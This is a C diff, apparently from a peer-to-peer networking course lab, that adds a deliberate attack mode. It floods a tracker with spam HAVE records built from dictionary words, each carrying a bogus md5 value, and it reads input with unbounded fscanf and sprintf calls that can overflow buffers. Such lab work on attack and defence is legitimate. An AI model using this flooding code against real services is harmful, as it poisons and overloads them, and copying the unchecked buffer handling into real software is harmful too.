@@ -977,13 +977,41 @@ static void overload_request(task_t *tracker_task) {
 	return;
 }
 
-static void spam_md5(task_t *tracker_task) {
+// spam_md5(tracker_task, dictionary, count)
+// spam the tracker md5 record using filenames from a dictionary file
+// generates "count" number of spam entries for each word in dictionary 
+static void spam_md5(task_t *tracker_task, const char* dictionary, int count) {
 	message("* Spam tacker with filenames and md5 values\n");
 
-	osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n",
-			     "spam", "Q3mAe3djcNCDKaXVj3AF7c");
-	
-	(void) read_tracker_response(tracker_task);
+	int i;
+	char filename[80];
+	char name[70] = {"\0"};
+	FILE *file;
+	file = fopen(dictionary, "r");
+
+	if(file == NULL) {
+    	message("* Dictionary file not found\n");
+    	return;
+	}
+
+	while(fscanf (file, "%s", name) != EOF) {
+
+		sprintf(filename, "%s.jpg", name);
+		osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n",
+			     filename, "Q3mAe3djcNCDKaXVj3AF7c");
+		(void) read_tracker_response(tracker_task);
+
+		for(i=1;i<=count;i++) {
+			sprintf(filename, "%s%d.jpg", name, i);
+			osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n",
+				     filename, "Q3mAe3djcNCDKaXVj3AF7c");
+			(void) read_tracker_response(tracker_task);
+			usleep(10000);
+		}
+	}
+
+	fclose(file);
+	message("* Spam complete\n");
 
 	return;
 }
@@ -1109,7 +1137,7 @@ int main(int argc, char *argv[])
 		overload_request(tracker_task);
 		
 		// TODO: spam bad md5sum values to tracker
-		spam_md5(tracker_task);
+		spam_md5(tracker_task, "../animals.txt", 10);
 	}
 	
 	// Parent serves upload requests
